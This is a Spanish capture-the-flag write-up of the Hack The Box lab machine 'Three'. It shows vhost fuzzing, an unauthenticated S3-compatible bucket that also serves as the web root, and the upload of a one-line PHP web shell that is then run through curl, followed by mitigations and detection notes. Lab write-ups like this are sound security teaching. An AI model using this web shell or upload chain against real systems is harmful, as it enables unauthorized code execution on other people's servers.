---
machine: Three
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [cloud, s3, web, linux, tier1]
---

# Three — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

Un vhost oculto (`s3.thetoppers.htb`) expone un **S3 compatible** sin autenticación real. Con `aws s3` se lista el bucket que sirve la web, se sube un `shell.php` y se ejecuta por HTTP: la flag está en `/var/www/flag.txt`.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

```bash
echo "<TARGET_IP>    thetoppers.htb" | sudo tee -a /etc/hosts
```

La web es una landing estática de «The Toppers».

## Enumeración

Fuzzing de virtual hosts:

```bash
ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 10918
```

Resultado:

```text
s3    [Status: 404, Size: 29]
```

`s3.thetoppers.htb` responde con un XML de error propio de S3, no con el 404 de Apache: hay un servicio de almacenamiento detrás.

```bash
curl -s http://s3.thetoppers.htb
```

```xml
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
```

## Foothold

Se configura el CLI con credenciales ficticias (el endpoint no las valida) y se apunta al vhost:

```bash
aws configure set aws_access_key_id temp
aws configure set aws_secret_access_key temp
aws configure set default.region us-east-1

aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

El bucket `thetoppers.htb` contiene el contenido del sitio (`index.php`, `images/`, `css/`). El mismo bucket es el document root, así que un fichero subido se sirve y se ejecuta:

```bash
cat > shell.php <<'PHP'
<?php system($_GET['cmd']); ?>
PHP

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
curl -s "http://thetoppers.htb/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
curl -s "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
```

## Movimiento lateral

- Un único host; el bucket y el servidor web comparten sistema de ficheros.
- El usuario `www-data` no da acceso a otros servicios.

## Escalada de privilegios

- No aplica: la flag es legible por `www-data`.
- En un caso real el siguiente paso sería revisar `wp-config.php`, variables de entorno y claves de la instancia.

## Evidencia

- Respuesta XML del endpoint S3 y listado del bucket.
- Ejecución de `id` y flag redactada.

## Lecciones aprendidas

- Un 404 con cuerpo distinto delata un servicio diferente en el mismo puerto: comparar tamaños en `ffuf` es la clave.
- Un almacenamiento de objetos con escritura y servido por el mismo servidor web equivale a subida de ficheros sin restricciones.
- Las credenciales del CLI pueden ser inventadas si el endpoint no aplica IAM: la autenticación ausente **es** la vulnerabilidad.
- En cloud mal montado, «subir un objeto» puede ser «ejecutar código».

## Mitigaciones y detección

**Cómo se corrige:**

- Autenticación y autorización reales en el endpoint S3 (IAM, políticas por bucket).
- Bucket separado del document root; nunca servir PHP desde almacenamiento de objetos.
- Deshabilitar la ejecución de scripts en el directorio de subidas.
- Restringir la exposición del servicio de almacenamiento a la red interna.

**Cómo se detectaría:**

- Peticiones `PUT`/`POST` a buckets desde IPs no habituales.
- Ficheros `.php` nuevos en el document root y ejecuciones con `cmd=`.
- `AccessDenied` repetidos seguidos de listados correctos (enumeración de buckets).

- CWE-306: Missing Authentication for Critical Function
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP Top 10 2021: A01 Broken Access Control
- MITRE ATT&CK: [T1530 Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/), [T1505.003 Web Shell](https://attack.mitre.org/techniques/T1505/003/)

## Referencias

- [AWS CLI — s3](https://docs.aws.amazon.com/cli/latest/reference/s3/)
- [HackTricks — S3 buckets](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum)
